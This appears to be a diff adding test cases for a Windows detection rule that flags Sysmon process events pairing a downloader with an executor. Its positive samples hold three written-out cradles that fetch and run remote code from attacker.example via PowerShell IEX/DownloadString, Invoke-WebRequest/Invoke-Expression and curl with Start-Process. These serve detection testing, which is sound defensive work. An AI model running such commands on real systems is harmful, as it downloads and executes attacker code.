@@ -1,0 +1,33 @@
+rule: win-syslog-003
+
+# Pins downloader + executor combination. Each alone is too noisy
+# (legit curl, legit Invoke-Expression in vendor scripts) but the
+# pair together is rarely benign.
+
+positive:
+  - description: PowerShell IEX + DownloadString cradle (Empire / classic)
+    event:
+      ident: Microsoft-Windows-Sysmon
+      message: 'Process Create:  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  CommandLine: "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(''http://attacker.example/stage2.ps1'')"'
+  - description: PowerShell Invoke-WebRequest + Invoke-Expression
+    event:
+      ident: Microsoft-Windows-Sysmon
+      message: 'Process Create:  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  CommandLine: "powershell.exe -c Invoke-Expression (Invoke-WebRequest ''https://attacker.example/c2.ps1'').Content"'
+  - description: cmd.exe curl + start-process
+    event:
+      ident: Microsoft-Windows-Sysmon
+      message: 'Process Create:  Image: C:\Windows\System32\cmd.exe  CommandLine: "cmd.exe /c curl http://attacker.example/run.exe -o stage.exe & Start-Process stage.exe"'
+
+negative:
+  - description: Routine vendor curl call (download only — no executor)
+    event:
+      ident: Microsoft-Windows-Sysmon
+      message: 'Process Create:  Image: C:\Program Files\Vendor\updater.exe  CommandLine: "updater.exe --check curl http://vendor.example/updates.json"'
+  - description: Routine PowerShell Invoke-Expression on a local file (no download primitive)
+    event:
+      ident: Microsoft-Windows-Sysmon
+      message: 'Process Create:  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  CommandLine: "powershell.exe -c Invoke-Expression (Get-Content C:\Scripts\local.ps1 -Raw)"'
+  - description: PowerShell ScriptBlock with the same shape but different ident
+    event:
+      ident: Microsoft-Windows-PowerShell
+      message: 'Création du texte Scriptblock : IEX (New-Object Net.WebClient).DownloadString(''http://x'')'
